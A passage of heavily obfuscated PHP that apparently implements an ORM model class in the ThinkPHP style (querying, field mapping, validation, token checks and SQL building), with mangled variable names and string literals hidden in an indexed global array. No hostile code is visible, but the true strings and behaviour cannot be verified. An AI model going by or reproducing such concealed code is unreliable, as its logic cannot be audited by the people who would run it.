$ÜÏÔ§ª; } protected function _options_filter(&$Ò´Èî) { } protected function _parseType(&$©ïØÔªä, $§ûûÒØé) { $ô¿ £®Å =& $_SERVER[ñ÷§¡å]; if (empty($this->options[$ô¿ £®Å[294]][$ô¿ £®Å[4] . $§ûûÒØé])) { $‚®Ê¢³Ü = strtolower($this->fields[$ô¿ £®Å[261]][$§ûûÒØé]); if (!1 !== strpos($‚®Ê¢³Ü, $ô¿ £®Å[295])) { } elseif (!1 === strpos($‚®Ê¢³Ü, $ô¿ £®Å[296]) && !1 !== strpos($‚®Ê¢³Ü, $ô¿ £®Å[297])) { $©ïØÔªä[$§ûûÒØé] = intval($©ïØÔªä[$§ûûÒØé]); } elseif (!1 !== strpos($‚®Ê¢³Ü, $ô¿ £®Å[298]) || !1 !== strpos($‚®Ê¢³Ü, $ô¿ £®Å[299])) { $©ïØÔªä[$§ûûÒØé] = floatval($©ïØÔªä[$§ûûÒØé]); } elseif (!1 !== strpos($‚®Ê¢³Ü, $ô¿ £®Å[300])) { $©ïØÔªä[$§ûûÒØé] = (bool) $©ïØÔªä[$§ûûÒØé]; } } } public function find($¸ï¸¬ = array()) { $¾®üŸ×Ñ =& $_SERVER[ñ÷§¡å]; if (is_numeric($¸ï¸¬) || is_string($¸ï¸¬)) { $€Ğõ¢Õ²[$this->getPk()] = intval($¸ï¸¬); $this->options[$¾®üŸ×Ñ[284]] = $€Ğõ¢Õ²; } $this->options[$¾®üŸ×Ñ[301]] = 1; $¸ï¸¬ = $this->_parseOptions(); $£Å»ß„ = $this->db->select($¸ï¸¬); if (!1 === $£Å»ß„) { return !1; } if (empty($£Å»ß„)) { return null; } $this->data = $£Å»ß„[0]; $this->_afterFind($this->data, $¸ï¸¬); if (!empty($this->options[$¾®üŸ×Ñ[302]])) { return $this->returnResult($this->data, $this->options[$¾®üŸ×Ñ[302]]); } return $this->data; } protected function _afterFind(&$½¦ëÁûÀ, $î‰üºÇâ) { } protected function returnResult($´¸âËçÉ, $Ÿ±ÊÆÀ = '') { $±Öšµ’ =& $_SERVER[ñ÷§¡å]; if ($Ÿ±ÊÆÀ) { if (is_callable($Ÿ±ÊÆÀ)) { return call_user_func($Ÿ±ÊÆÀ, $´¸âËçÉ); } switch (strtolower($Ÿ±ÊÆÀ)) { case $±Öšµ’[303]: return json_encode($´¸âËçÉ); case $±Öšµ’[304]: return xml_encode($´¸âËçÉ); } } return $´¸âËçÉ; } public function parseFieldsMap($‚ÀÅúíÌ, $ü§ÑÖ¡‡ = 1) { if (!empty($this->_map)) { foreach ($this->_map as $Ÿô×õî„ => $Ñ½‹ÌÕÀ) { if ($ü§ÑÖ¡‡ == 1) { if (isset($‚ÀÅúíÌ[$Ñ½‹ÌÕÀ])) { $‚ÀÅúíÌ[$Ÿô×õî„] = $‚ÀÅúíÌ[$Ñ½‹ÌÕÀ]; unset($‚ÀÅúíÌ[$Ñ½‹ÌÕÀ]); } } else { if (isset($‚ÀÅúíÌ[$Ÿô×õî„])) { $‚ÀÅúíÌ[$Ñ½‹ÌÕÀ] = $‚ÀÅúíÌ[$Ÿô×õî„]; unset($‚ÀÅúíÌ[$Ÿô×õî„]); } } } } return $‚ÀÅúíÌ; } public function setField($»ĞŸ›–¶, $÷‹åù¿„ = '') { if (is_array($»ĞŸ›–¶)) { $É§ˆšèê = $»ĞŸ›–¶; } else { $É§ˆšèê[$»ĞŸ›–¶] = $÷‹åù¿„; } return $this->save($É§ˆšèê); } public function setAdd($Èöëü, $Ü‚¹§±Î = 1) { $½ôùë¢Ô =& $_SERVER[ñ÷§¡å]; $¥º«’Ë = $Èöëü . $½ôùë¢Ô[305] . $Ü‚¹§±Î; if ($Ü‚¹§±Î < 0) { $¥º«’Ë = $Èöëü . $Ü‚¹§±Î; } return $this->setField($Èöëü, array($½ôùë¢Ô[306], $¥º«’Ë)); } public function getField($Ğİ’ÚÀÆ, $ËÅ¡©Õ = null) { $ªÔëë„ì =& $_SERVER[ñ÷§¡å]; $ÔÜ˜íù‰[$ªÔëë„ì[282]] = $Ğİ’ÚÀÆ; $ÔÜ˜íù‰ = $this->_parseOptions($ÔÜ˜íù‰); $Ğİ’ÚÀÆ = trim($Ğİ’ÚÀÆ); if (strpos($Ğİ’ÚÀÆ, $ªÔëë„ì[50])) { if (!isset($ÔÜ˜íù‰[$ªÔëë„ì[301]])) { $ÔÜ˜íù‰[$ªÔëë„ì[301]] = is_numeric($ËÅ¡©Õ) ? $ËÅ¡©Õ : $ªÔëë„ì[12]; } $ÙÎÂè»” = $this->db->select($ÔÜ˜íù‰); if (!empty($ÙÎÂè»”)) { $ÄĞ¾­Æ = explode($ªÔëë„ì[50], $Ğİ’ÚÀÆ); $Ğİ’ÚÀÆ = array_keys($ÙÎÂè»”[0]); $Ğ¥²ş×¼ = array_shift($Ğİ’ÚÀÆ); $–½­øË = array_shift($Ğİ’ÚÀÆ); $û¬¦·Û® = array(); $Û÷ÓªÊƒ = count($ÄĞ¾­Æ); foreach ($ÙÎÂè»” as $ã‚¢±¥Æ) { $Èû±Ò œ = $ã‚¢±¥Æ[$Ğ¥²ş×¼]; if (2 == $Û÷ÓªÊƒ) { $û¬¦·Û®[$Èû±Ò œ] = $ã‚¢±¥Æ[$–½­øË]; } else { $û¬¦·Û®[$Èû±Ò œ] = is_string($ËÅ¡©Õ) ? implode($ËÅ¡©Õ, $ã‚¢±¥Æ) : $ã‚¢±¥Æ; } } return $û¬¦·Û®; } } else { if (!0 !== $ËÅ¡©Õ) { $ÔÜ˜íù‰[$ªÔëë„ì[301]] = is_numeric($ËÅ¡©Õ) ? $ËÅ¡©Õ : 1; } if ($ËÅ¡©Õ === $ªÔëë„ì[264]) { unset($ÔÜ˜íù‰[$ªÔëë„ì[301]]); } $ã‚¢±¥Æ = $this->db->select($ÔÜ˜íù‰); if (!empty($ã‚¢±¥Æ)) { if ($ËÅ¡©Õ === $ªÔëë„ì[264]) { return reset($ã‚¢±¥Æ[0]); } if (!0 !== $ËÅ¡©Õ && 1 == $ÔÜ˜íù‰[$ªÔëë„ì[301]]) { return reset($ã‚¢±¥Æ[0]); } foreach ($ã‚¢±¥Æ as $æ˜›šş†) { $´Ùà»œ°[] = $æ˜›šş†[$Ğİ’ÚÀÆ]; } return $´Ùà»œ°; } } return null; } public function create($¦Ïâ³åÅ = '', $ç‡Ê‚ş = '') { $¡­–çŠ =& $_SERVER[ñ÷§¡å]; if (empty($¦Ïâ³åÅ)) { $¦Ïâ³åÅ = $_POST; } elseif (is_object($¦Ïâ³åÅ)) { $¦Ïâ³åÅ = get_object_vars($¦Ïâ³åÅ); } if (empty($¦Ïâ³åÅ) || !is_array($¦Ïâ³åÅ)) { $this->error = think_lang($¡­–çŠ[280]); return !1; } $¦Ïâ³åÅ = $this->parseFieldsMap($¦Ïâ³åÅ, 0); $ç‡Ê‚ş = $ç‡Ê‚ş ? $ç‡Ê‚ş : (!empty($¦Ïâ³åÅ[$this->getPk()]) ? THINK_MODEL_UPDATE : THINK_MODEL_INSERT); if (isset($this->options[$¡­–çŠ[282]])) { $õ­˜´Úì = $this->options[$¡­–çŠ[282]]; unset($this->options[$¡­–çŠ[282]]); } elseif ($ç‡Ê‚ş == THINK_MODEL_INSERT && isset($this->insertFields)) { $õ­˜´Úì = $this->insertFields; } elseif ($ç‡Ê‚ş == THINK_MODEL_UPDATE && isset($this->updateFields)) { $õ­˜´Úì = $this->updateFields; } if (isset($õ­˜´Úì)) { if (is_string($õ­˜´Úì)) { $õ­˜´Úì = explode($¡­–çŠ[50], $õ­˜´Úì); } if (think_config($¡­–çŠ[307])) { $õ­˜´Úì[] = think_config($¡­–çŠ[308]); } foreach ($¦Ïâ³åÅ as $¶’À»×‹ => $©àıã«û) { if (!in_array($¶’À»×‹, $õ­˜´Úì)) { unset($¦Ïâ³åÅ[$¶’À»×‹]); } } } if (!$this->autoValidation($¦Ïâ³åÅ, $ç‡Ê‚ş)) { return !1; } if (!$this->autoCheckToken($¦Ïâ³åÅ)) { $this->error = think_lang($¡­–çŠ[309]); return !1; } if ($this->autoCheckFields) { $õ­˜´Úì = $this->getDbFields(); foreach ($¦Ïâ³åÅ as $¶’À»×‹ => $©àıã«û) { if (!in_array($¶’À»×‹, $õ­˜´Úì)) { unset($¦Ïâ³åÅ[$¶’À»×‹]); } elseif (MAGIC_QUOTES_GPC && is_string($©àıã«û)) { $¦Ïâ³åÅ[$¶’À»×‹] = stripslashes($©àıã«û); } } } $this->autoOperation($¦Ïâ³åÅ, $ç‡Ê‚ş); $this->data = $¦Ïâ³åÅ; return $¦Ïâ³åÅ; } public function autoCheckToken($ÈšøÎ¨ñ) { $çêµ–Í =& $_SERVER[ñ÷§¡å]; if (isset($this->options[$çêµ–Í[310]]) && !$this->options[$çêµ–Í[310]]) { return !0; } if (think_config($çêµ–Í[307])) { $œƒÑı = think_config($çêµ–Í[308]); if (!isset($ÈšøÎ¨ñ[$œƒÑı]) || Session::get($œƒÑı)) { return !1; } list($‚¹£Ïùø, $…¥î€±Ì) = explode($çêµ–Í[11], $ÈšøÎ¨ñ[$œƒÑı]); if ($…¥î€±Ì && Session::get($œƒÑı . $çêµ–Í[10] . $‚¹£Ïùø) === $…¥î€±Ì) { Session::remove($œƒÑı . $çêµ–Í[10] . $‚¹£Ïùø); return !0; } if (think_config($çêµ–Í[311])) { Session::remove($œƒÑı . $çêµ–Í[10] . $‚¹£Ïùø); } return !1; } return !0; } public function regex($Ü³àæ›, $·ú–¹é) { $ë™œòÆ¥ =& $_SERVER[ñ÷§¡å]; $«ëÕ“à“ = array($ë™œòÆ¥[312] => $ë™œòÆ¥[313], $ë™œòÆ¥[314] => $ë™œòÆ¥[315], $ë™œòÆ¥[316] => $ë™œòÆ¥[317], $ë™œòÆ¥[318] => $ë™œòÆ¥[319], $ë™œòÆ¥[320] => $ë™œòÆ¥[321], $ë™œòÆ¥[322] => $ë™œòÆ¥[323], $ë™œòÆ¥[324] => $ë™œòÆ¥[325], $ë™œòÆ¥[299] => $ë™œòÆ¥[326], $ë™œòÆ¥[327] => $ë™œòÆ¥[328]); if (isset($«ëÕ“à“[strtolower($·ú–¹é)])) { $·ú–¹é = $«ëÕ“à“[strtolower($·ú–¹é)]; } return preg_match($·ú–¹é, $Ü³àæ›) === 1; } private function autoOperation(&$šï®æˆ¹, $ããÓ°ØÃ) { $´°Œ†Ê÷ =& $_SERVER[ñ÷§¡å]; if (!empty($this->options[$´°Œ†Ê÷[329]])) { $Ë‡›É€ = $this->options[$´°Œ†Ê÷[329]]; unset($this->options[$´°Œ†Ê÷[329]]); } elseif (!empty($this->_auto)) { $Ë‡›É€ = $this->_auto; } if (isset($Ë‡›É€)) { foreach ($Ë‡›É€ as $Ş’Ñ®ŞŸ) { if (empty($Ş’Ñ®ŞŸ[2])) { $Ş’Ñ®ŞŸ[2] = THINK_MODEL_INSERT; } if ($ããÓ°ØÃ == $Ş’Ñ®ŞŸ[2] || $Ş’Ñ®ŞŸ[2] == THINK_MODEL_BOTH) { switch (trim($Ş’Ñ®ŞŸ[3])) { case $´°Œ†Ê÷[330]: case $´°Œ†Ê÷[331]: $ÒÙ…²¨ = isset($Ş’Ñ®ŞŸ[4]) ? (array) $Ş’Ñ®ŞŸ[4] : array(); if (isset($šï®æˆ¹[$Ş’Ñ®ŞŸ[0]])) { array_unshift($ÒÙ…²¨, $šï®æˆ¹[$Ş’Ñ®ŞŸ[0]]); } if ($´°Œ†Ê÷[330] == $Ş’Ñ®ŞŸ[3]) { $šï®æˆ¹[$Ş’Ñ®ŞŸ[0]] = call_user_func_array($Ş’Ñ®ŞŸ[1], $ÒÙ…²¨); } else { $šï®æˆ¹[$Ş’Ñ®ŞŸ[0]] = call_user_func_array(array(&$this, $Ş’Ñ®ŞŸ[1]), $ÒÙ…²¨); } break; case $´°Œ†Ê÷[282]: $šï®æˆ¹[$Ş’Ñ®ŞŸ[0]] = $šï®æˆ¹[$Ş’Ñ®ŞŸ[1]]; break; case $´°Œ†Ê÷[332]: if ($´°Œ†Ê÷[12] === $šï®æˆ¹[$Ş’Ñ®ŞŸ[0]]) { unset($šï®æˆ¹[$Ş’Ñ®ŞŸ[0]]); } break; case $´°Œ†Ê÷[333]: default: $šï®æˆ¹[$Ş’Ñ®ŞŸ[0]] = $Ş’Ñ®ŞŸ[1]; } if (!1 === $šï®æˆ¹[$Ş’Ñ®ŞŸ[0]]) { unset($šï®æˆ¹[$Ş’Ñ®ŞŸ[0]]); } } } } return $šï®æˆ¹; } protected function autoValidation($¸ÌÑˆ†ı, $äÂ”ıŸ) { $Î’ºÇ™ş =& $_SERVER[ñ÷§¡å]; if (!empty($this->options[$Î’ºÇ™ş[334]])) { $¡Â”¹´Æ = $this->options[$Î’ºÇ™ş[334]]; unset($this->options[$Î’ºÇ™ş[334]]); } elseif (!empty($this->_validate)) { $¡Â”¹´Æ = $this->_validate; } if (isset($¡Â”¹´Æ)) { if ($this->patchValidate) { $this->error = array(); } foreach ($¡Â”¹´Æ as $·‰²Ğü… => $ÑéÑï‰) { if (empty($ÑéÑï‰[5]) || $ÑéÑï‰[5] == THINK_MODEL_BOTH || $ÑéÑï‰[5] == $äÂ”ıŸ) { if (0 == strpos($ÑéÑï‰[2], $Î’ºÇ™ş[335]) && strpos($ÑéÑï‰[2], $Î’ºÇ™ş[336])) { $ÑéÑï‰[2] = think_lang(substr($ÑéÑï‰[2], 2, -1)); } $ÑéÑï‰[3] = isset($ÑéÑï‰[3]) ? $ÑéÑï‰[3] : THINK_EXISTS_VALIDATE; $ÑéÑï‰[4] = isset($ÑéÑï‰[4]) ? $ÑéÑï‰[4] : $Î’ºÇ™ş[337]; switch ($ÑéÑï‰[3]) { case THINK_MUST_VALIDATE: if (!1 === $this->_validationField($¸ÌÑˆ†ı, $ÑéÑï‰)) { return !1; } break; case THINK_VALUE_VALIDATE: if ($Î’ºÇ™ş[12] != trim($¸ÌÑˆ†ı[$ÑéÑï‰[0]])) { if (!1 === $this->_validationField($¸ÌÑˆ†ı, $ÑéÑï‰)) { return !1; } } break; default: if (isset($¸ÌÑˆ†ı[$ÑéÑï‰[0]])) { if (!1 === $this->_validationField($¸ÌÑˆ†ı, $ÑéÑï‰)) { return !1; } } } } } if (!empty($this->error)) { return !1; } } return !0; } protected function _validationField($Ø´•É´È, $§ì±¤éÔ) { if (!1 === $this->_validationFieldItem($Ø´•É´È, $§ì±¤éÔ)) { if ($this->patchValidate) { $this->error[$§ì±¤éÔ[0]] = $§ì±¤éÔ[2]; } else { $this->error = $§ì±¤éÔ[2]; return !1; } } return; } protected function _validationFieldItem($æË¬Ñ©¬, $ı«ÑàÃÖ) { $¹“„ü¶á =& $_SERVER[ñ÷§¡å]; switch (strtolower(trim($ı«ÑàÃÖ[4]))) { case $¹“„ü¶á[330]: case $¹“„ü¶á[331]: $²Ô³Ù‡‹ = isset($ı«ÑàÃÖ[6]) ? (array) $ı«ÑàÃÖ[6] : array(); if (is_string($ı«ÑàÃÖ[0]) && strpos($ı«ÑàÃÖ[0], $¹“„ü¶á[50])) { $ı«ÑàÃÖ[0] = explode($¹“„ü¶á[50], $ı«ÑàÃÖ[0]); } if (is_array($ı«ÑàÃÖ[0])) { foreach ($ı«ÑàÃÖ[0] as $—”Ô°¾‡) { $üå¢é§³[$—”Ô°¾‡] = $æË¬Ñ©¬[$—”Ô°¾‡]; } array_unshift($²Ô³Ù‡‹, $üå¢é§³); } else { array_unshift($²Ô³Ù‡‹, $æË¬Ñ©¬[$ı«ÑàÃÖ[0]]); } if ($¹“„ü¶á[330] == $ı«ÑàÃÖ[4]) { return call_user_func_array($ı«ÑàÃÖ[1], $²Ô³Ù‡‹); } else { return call_user_func_array(array(&$this, $ı«ÑàÃÖ[1]), $²Ô³Ù‡‹); } case $¹“„ü¶á[338]: return $æË¬Ñ©¬[$ı«ÑàÃÖ[0]] == $æË¬Ñ©¬[$ı«ÑàÃÖ[1]]; case $¹“„ü¶á[339]: if (is_string($ı«ÑàÃÖ[0]) && strpos($ı«ÑàÃÖ[0], $¹“„ü¶á[50])) { $ı«ÑàÃÖ[0] = explode($¹“„ü¶á[50], $ı«ÑàÃÖ[0]); } $«šÔ„˜ = array(); if (is_array($ı«ÑàÃÖ[0])) { foreach ($ı«ÑàÃÖ[0] as $—”Ô°¾‡) { $«šÔ„˜[$—”Ô°¾‡] = $æË¬Ñ©¬[$—”Ô°¾‡]; } } else { $«šÔ„˜[$ı«ÑàÃÖ[0]] = $æË¬Ñ©¬[$ı«ÑàÃÖ[0]]; } if (!empty($æË¬Ñ©¬[$this->getPk()])) { $«šÔ„˜[$this->getPk()] = array($¹“„ü¶á[340], $æË¬Ñ©¬[$this->getPk()]); } if ($this->where($«šÔ„˜)->find()) { return !1; } return !0; default: return $this->check($æË¬Ñ©¬[$ı«ÑàÃÖ[0]], $ı«ÑàÃÖ[1], $ı«ÑàÃÖ[4]); } } public function check($«’”ÉÍ°, $ÄŠ›­Ûà, $Š“õÖìË = "\162\145\147\x65\x78") { $±ªÖ¼…Å =& $_SERVER[ñ÷§¡å]; $Š“õÖìË = strtolower(trim($Š“õÖìË)); switch ($Š“õÖìË) { case $±ªÖ¼…Å[7]: case $±ªÖ¼…Å[341]: $İÅ¡Û‡Ÿ = is_array($ÄŠ›­Ûà) ? $ÄŠ›­Ûà : explode($±ªÖ¼…Å[50], $ÄŠ›­Ûà); return $Š“õÖìË == $±ªÖ¼…Å[7] ? in_array($«’”ÉÍ°, $İÅ¡Û‡Ÿ) : !in_array($«’”ÉÍ°, $İÅ¡Û‡Ÿ); case $±ªÖ¼…Å[342]: case $±ªÖ¼…Å[343]: if (is_array($ÄŠ›­Ûà)) { $½å²· = $ÄŠ›­Ûà[0]; $£°íÆËë = $ÄŠ›­Ûà[1]; } else { list($½å²·, $£°íÆËë) = explode($±ªÖ¼…Å[50], $ÄŠ›­Ûà); } return $Š“õÖìË == $±ªÖ¼…Å[342] ? $«’”ÉÍ° >= $½å²· && $«’”ÉÍ° <= $£°íÆËë : $«’”ÉÍ° < $½å²· || $«’”ÉÍ° > $£°íÆËë; case $±ªÖ¼…Å[344]: case $±ªÖ¼…Å[345]: return $Š“õÖìË == $±ªÖ¼…Å[344] ? $«’”ÉÍ° == $ÄŠ›­Ûà : $«’”ÉÍ° != $ÄŠ›­Ûà; case $±ªÖ¼…Å[346]: $™‹“Šï– = mb_strlen($«’”ÉÍ°, $±ªÖ¼…Å[347]); if (strpos($ÄŠ›­Ûà, $±ªÖ¼…Å[50])) { list($½å²·, $£°íÆËë) = explode($±ªÖ¼…Å[50], $ÄŠ›­Ûà); return $™‹“Šï– >= $½å²· && $™‹“Šï– <= $£°íÆËë; } else { return $™‹“Šï– == $ÄŠ›­Ûà; } case $±ªÖ¼…Å[348]: list($¶Êé’÷¹, $˜È»Œİª) = explode($±ªÖ¼…Å[50], $ÄŠ›­Ûà); if (!is_numeric($¶Êé’÷¹)) { $¶Êé’÷¹ = strtotime($¶Êé’÷¹); } if (!is_numeric($˜È»Œİª)) { $˜È»Œİª = strtotime($˜È»Œİª); } return NOW_TIME >= $¶Êé’÷¹ && NOW_TIME <= $˜È»Œİª; case $±ªÖ¼…Å[349]: return in_array(get_client_ip(), explode($±ªÖ¼…Å[50], $ÄŠ›­Ûà)); case $±ªÖ¼…Å[350]: return !in_array(get_client_ip(), explode($±ªÖ¼…Å[50], $ÄŠ›­Ûà)); case $±ªÖ¼…Å[337]: default: return $this->regex($«’”ÉÍ°, $ÄŠ›­Ûà); } } public function query($µâô¾ÅÁ, $¤‘ºÕğ· = false) { $ó”Âºâñ =& $_SERVER[ñ÷§¡å]; if (!is_bool($¤‘ºÕğ·) && !is_array($¤‘ºÕğ·)) { $¤‘ºÕğ· = func_get_args(); array_shift($¤‘ºÕğ·); } $µâô¾ÅÁ = str_replace(array($ó”Âºâñ[65], $ó”Âºâñ[351]), $ó”Âºâñ[53], $µâô¾ÅÁ); $µâô¾ÅÁ = $this->parseSql($µâô¾ÅÁ, $¤‘ºÕğ·); return $this->db->query($µâô¾ÅÁ); } public function execute($¼» ğÀã, $‡¡Úóâï = false) { if (!is_bool($‡¡Úóâï) && !is_array($‡¡Úóâï)) { $‡¡Úóâï = func_get_args(); array_shift($‡¡Úóâï); } $¼» ğÀã = $this->parseSql($¼» ğÀã, $‡¡Úóâï); return $this->db->execute($¼» ğÀã); } protected function parseSql($ëËáó¶¼, $¡î—š–œ) { $İä•Ò¯ =& $_SERVER[ñ÷§¡å]; if (!0 === $¡î—š–œ) { $‰›§Ëİ” = $this->_parseOptions(); $ëËáó¶¼ = $this->db->parseSql($ëËáó¶¼, $‰›§Ëİ”); } elseif (is_array($¡î—š–œ)) { $¡î—š–œ = array_map(array($this->db, $İä•Ò¯[352]), $¡î—š–œ); $ëËáó¶¼ = vsprintf($ëËáó¶¼, $¡î—š–œ); } else { $ëËáó¶¼ = strtr($ëËáó¶¼, array($İä•Ò¯[353] => $this->getTableName(), $İä•Ò¯[354] => think_config($İä•Ò¯[253]))); } $this->db->setModel($this->name); return $ëËáó¶¼; } public function db($í×º¬¯é = '', $½Á®İ§è = '', $¿í îÍå = array()) { $ÎØ†ª±Ì =& $_SERVER[ñ÷§¡å]; if ($ÎØ†ª±Ì[12] === $í×º¬¯é && $this->db) { return $this->db; } static $…—§™ş’ = array(); static $ˆ¾³¿š = array(); if (!isset($ˆ¾³¿š[$í×º¬¯é]) || isset($ˆ¾³¿š[$í×º¬¯é]) && $½Á®İ§è && $…—§™ş’[$í×º¬¯é] != $½Á®İ§è) { if (!empty($½Á®İ§è) && is_string($½Á®İ§è) && !1 === strpos($½Á®İ§è, $ÎØ†ª±Ì[8])) { $½Á®İ§è = think_config($½Á®İ§è); } $í×º¬¯é = think_guid($½Á®İ§è); $ˆ¾³¿š[$í×º¬¯é] = Db::getInstance($½Á®İ§è); } elseif (NULL === $½Á®İ§è) { $ˆ¾³¿š[$í×º¬¯é]->close(); unset($ˆ¾³¿š[$í×º¬¯é]); return; } if (!empty($¿í îÍå)) { if (is_string($¿í îÍå)) { parse_str($¿í îÍå, $¿í îÍå); } foreach ($¿í îÍå as $®Šİòø§ => $Ş¿äçÊ×) { $this->setProperty($®Šİòø§, $Ş¿äçÊ×); } } $…—§™ş’[$í×º¬¯é] = $½Á®İ§è; $this->db = $ˆ¾³¿š[$í×º¬¯é]; $this->_after_db(); if (!empty($this->name) && $this->autoCheckFields) { $this->_checkTableInfo(); } return $this; } protected function _after_db() { } public function getModelName() { if (empty($this->name)) { $»ÏóË»ö = get_class($this); if ($»ÏóË»ö == $_SERVER[ñ÷§¡å][355]) { return $this->name; } $this->name = substr($»ÏóË»ö, 0, -5); } return $this->name; } public function getTableName() { $ÎÈ°³¿î =& $_SERVER[ñ÷§¡å]; if (empty($this->trueTableName)) { $½ò÷°™´ = !empty($this->tablePrefix) ? $this->tablePrefix : $ÎÈ°³¿î[12]; if (!empty($this->tableName)) { $½ò÷°™´ .= $this->tableName; } else { $½ò÷°™´ .= think_parse_name($this->name); } $this->trueTableName = strtolower($½ò÷°™´); } return (!empty($this->dbName) ? $this->dbName . $ÎÈ°³¿î[10] : $ÎÈ°³¿î[12]) . $this->trueTableName; } public function startTrans() { $this->commit(); $this->db->startTrans(); return; } public function commit() { return $this->db->commit(); } public function rollback() { return $this->db->rollback(); } public function getError() { return $this->error; } public function getDbError() { return $this->db->getError(); } public function getLastInsID() { return $this->db->getLastInsID(); } public function getLastSql() { return $this->db->getLastSql($this->name); } public function _sql() { return $this->getLastSql(); } public function getPk() { $öøäÈ•Ÿ =& $_SERVER[ñ÷§¡å]; return isset($this->fields[$öøäÈ•Ÿ[260]]) ? $this->fields[$öøäÈ•Ÿ[260]] : $this->pk; } public function getDbFields() { $‡êöÛœØ =& $_SERVER[ñ÷§¡å]; if (isset($this->options[$‡êöÛœØ[288]])) { $ïŠ·¡¡¤ = $this->db->getFields($this->options[$‡êöÛœØ[288]]); return $ïŠ·¡¡¤ ? array_keys($ïŠ·¡¡¤) : !1; } if ($this->fields) { $ïŠ·¡¡¤ = $this->fields; unset($ïŠ·¡¡¤[$‡êöÛœØ[259]], $ïŠ·¡¡¤[$‡êöÛœØ[260]], $ïŠ·¡¡¤[$‡êöÛœØ[261]], $ïŠ·¡¡¤[$‡êöÛœØ[258]]); return $ïŠ·¡¡¤; } return !1; } public function data($í«÷ã¯¶ = '') { $©Áİ·ş¿ =& $_SERVER[ñ÷§¡å]; if ($©Áİ·ş¿[12] === $í«÷ã¯¶ && !empty($this->data)) { return $this->data; } if (is_object($í«÷ã¯¶)) { $í«÷ã¯¶ = get_object_vars($í«÷ã¯¶); } elseif (is_string($í«÷ã¯¶)) { parse_str($í«÷ã¯¶, $í«÷ã¯¶); } elseif (!is_array($í«÷ã¯¶)) { think_exception(think_lang($©Áİ·ş¿[280])); } $this->data = $í«÷ã¯¶; return $this; } public function join($Ã‡¿ÁëÑ) { $¼Ö§û¨ =& $_SERVER[ñ÷§¡å]; if (is_array($Ã‡¿ÁëÑ)) { $this->options[$¼Ö§û¨[291]] = $Ã‡¿ÁëÑ; } elseif (!empty($Ã‡¿ÁëÑ)) { $this->options[$¼Ö§û¨[291]][] = $Ã‡¿ÁëÑ; } return $this; } public function union($ÉÃÅÍßã, $éûÖ‘‘ö = false) { $ß–—Ã Ç =& $_SERVER[ñ÷§¡å]; if (empty($ÉÃÅÍßã)) { return $this; } if ($éûÖ‘‘ö) { $this->options[$ß–—Ã Ç[356]][$ß–—Ã Ç[357]] = !0; } if (is_object($ÉÃÅÍßã)) { $ÉÃÅÍßã = get_object_vars($ÉÃÅÍßã); } if (is_string($ÉÃÅÍßã)) { $ÉÖ»ò“ = $ÉÃÅÍßã; } elseif (is_array($ÉÃÅÍßã)) { if (isset($ÉÃÅÍßã[0])) { $this->options[$ß–—Ã Ç[356]] = array_merge($this->options[$ß–—Ã Ç[356]], $ÉÃÅÍßã); return $this; } else { $ÉÖ»ò“ = $ÉÃÅÍßã; } } else { think_exception(think_lang($ß–—Ã Ç[280])); } $this->options[$ß–—Ã Ç[356]][] = $ÉÖ»ò“; return $this; } public function cache($¿êˆƒ­© = true, $Ñµñ¿ƒ× = null, $â©òşéÖ = '') { $›¡ş„Ùè =& $_SERVER[ñ÷§¡å]; if (!1 !== $¿êˆƒ­©) { $this->options[$›¡ş„Ùè[358]] = array($›¡ş„Ùè[104] => $¿êˆƒ­©, $›¡ş„Ùè[348] => $Ñµñ¿ƒ×, $›¡ş„Ùè[33] => $â©òşéÖ); } return $this; } public function field($ˆÖáÄ¨•, $úË¾¿ŒÖ = false) { $ô½Ú§±£ =& $_SERVER[ñ÷§¡å]; if (!0 === $ˆÖáÄ¨•) { $ËÁŸ¾Šñ = $this->getDbFields(); $ˆÖáÄ¨• = $ËÁŸ¾Šñ ? $ËÁŸ¾Šñ : $ô½Ú§±£[198]; } elseif ($úË¾¿ŒÖ) { if (is_string($ˆÖáÄ¨•)) { $ˆÖáÄ¨• = explode($ô½Ú§±£[50], $ˆÖáÄ¨•); } $ËÁŸ¾Šñ = $this->getDbFields(); $ˆÖáÄ¨• = $ËÁŸ¾Šñ ? array_diff($ËÁŸ¾Šñ, $ˆÖáÄ¨•) : $ˆÖáÄ¨•; } $this->options[$ô½Ú§±£[282]] = $ˆÖáÄ¨•; return $this; } public function scope($Ü™ í« = '', $æ±ÚºÍ— = NULL) { $¼½¯óÄÓ =& $_SERVER[ñ÷§¡å]; if ($¼½¯óÄÓ[12] === $Ü™ í«) { if (isset($this->_scope[$¼½¯óÄÓ[37]])) { $çÃÖÛ‚ = $this->_scope[$¼½¯óÄÓ[37]]; } else { return $this; } } elseif (is_string($Ü™ í«)) { $›ÃæÍ¶ì = explode($¼½¯óÄÓ[50], $Ü™ í«); $çÃÖÛ‚ = array(); foreach ($›ÃæÍ¶ì as $ì…½¨) { if (!isset($this->_scope[$ì…½¨])) { continue; } $çÃÖÛ‚ = array_merge($çÃÖÛ‚, $this->_scope[$ì…½¨]); } if (!empty($æ±ÚºÍ—) && is_array($æ±ÚºÍ—)) { $çÃÖÛ‚ = array_merge($çÃÖÛ‚, $æ±ÚºÍ—); } } elseif (is_array($Ü™ í«)) { $çÃÖÛ‚ = $Ü™ í«; } if (is_array($çÃÖÛ‚) && !empty($çÃÖÛ‚)) { $this->options = array_merge($this->options, array_change_key_case($çÃÖÛ‚)); } return $this; } public function where($åì¨ÑÔª, $ŒÛ±íÒª = null) { $‚—ëÄí³ =& $_SERVER[ñ÷§¡å]; if (!is_null($ŒÛ±íÒª) && is_string($åì¨ÑÔª)) { if (!is_array($ŒÛ±íÒª)) { $ŒÛ±íÒª = func_get_args(); array_shift($ŒÛ±íÒª); } $ŒÛ±íÒª = array_map(array($this->db, $‚—ëÄí³[352]), $ŒÛ±íÒª); $åì¨ÑÔª = vsprintf($åì¨ÑÔª, $ŒÛ±íÒª); } elseif (is_object($åì¨ÑÔª)) { $åì¨ÑÔª = get_object_vars($åì¨ÑÔª); } elseif (is_array($åì¨ÑÔª)) { foreach ($åì¨ÑÔª as $Ñ—·¶â’ => $²½ñª¹ï) { if ((is_numeric($Ñ—·¶â’) || !$Ñ—·¶â’) && is_string($²½ñª¹ï)) { if (strpos($²½ñª¹ï, $‚—ëÄí³[359]) === 0) { continue; } think_trace($‚—ëÄí³[360], $‚—ëÄí³[12], $‚—ëÄí³[49]); die; } } } if (is_string($åì¨ÑÔª) && $‚—ëÄí³[12] != $åì¨ÑÔª) { $ê´¡Ùëô = array(); $ê´¡Ùëô[$‚—ëÄí³[361]] = $åì¨ÑÔª; $åì¨ÑÔª = $ê´¡Ùëô; } if (isset($this->options[$‚—ëÄí³[284]])) { $this->options[$‚—ëÄí³[284]] = 